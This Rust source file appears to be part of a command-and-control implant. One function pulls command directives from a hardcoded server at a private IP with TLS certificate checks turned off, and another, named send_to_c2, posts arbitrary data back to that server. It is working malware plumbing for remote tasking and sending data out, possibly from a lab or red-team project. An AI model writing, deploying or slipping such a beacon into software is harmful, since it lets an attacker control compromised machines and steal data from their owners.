use reqwest::Error;
use serde::Deserialize;

enum _Status {
    SUCCESSFUL,
    FAILED,
}
#[derive(Deserialize)]
struct Directive {
    // id: String,
    command: String,
    // status: String,
}

pub async fn get_directives() -> Result<Vec<String>, Error> {
    let url = "https://172.28.161.20:3030/directives";

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let response = client.get(url).send().await?.error_for_status()?;

    let directives: Vec<Directive> = response.json().await?;

    let commands: Vec<String> = directives
        .into_iter()
        .map(|directive| directive.command)
        .collect();

    Ok(commands)
}

pub async fn send_to_c2(data: Vec<u8>) -> Result<(), Error> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    let _res = client
        .post("https://172.28.161.20:3030/directives")
        .body(data)
        .send()
        .await?;

    Ok(())
}
